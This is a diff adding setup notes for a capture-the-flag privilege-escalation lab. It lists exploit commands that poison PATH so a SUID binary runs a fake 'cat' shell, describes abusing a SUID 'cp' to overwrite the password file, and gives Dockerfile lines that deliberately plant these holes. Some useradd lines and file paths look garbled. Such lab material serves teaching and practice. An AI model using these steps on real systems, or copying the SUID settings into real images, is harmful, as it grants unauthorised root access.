@@ -1,0 +1,38 @@
+CTF Vulnerability Setup Notes:
+
+For privesc from user 'intern' to user 'manager':
+
+-Add source.c file, runme file and research.txt file to intern directory
+-The runme file has SUID bit set
+-The source.c file sets uid to manager uid
+-If we echo $PATH it shows the legitimate filepaths the system looks for cat
+-Using path poisoning, we can mangle the path that system looks at for the cat command to run our dodgy version of cat
+
+The exploit:
+
+- echo "/bin/sh" > /tmp/cat
+- chmod a+x /tmp/cat
+- export PATH=/tmp:$PATH
+- now run the runme file
+- you have shell as manager to now go from manager to root
+
+For privesc from user 'manager' to user 'root':
+
+-manager needs to be owner of a binary file such as cp
+-have SUID bit set on binary file
+-user can now do binary SUID exploit of cp command to become root
+-example I done was cp of a modified psswd file to /etc/psswd
+
+Dockerfile changes:
+
+RUN useradd -rm -d /home/intern -s /bin/bash -u 111 psswd fkjkecih
+RUN useradd -rm -d /home/manager -s /bin/bash -u 222 pswd flhvflwe
+COPY source.c research.txt /home/intern/
+RUN gcc -o runme source.c
+COPY managerflag.txt /home/manager
+RUN chmod 400 /home/manager/managerflag.txt
+RUN chmod u+s /home/intern/runme
+RUN chown manager /bin/cp
+RUN chmod u+s /bin/cp
+COPY rootflag.txt /home/root
+RUN chmod 400 /home/root/rootflag.txt
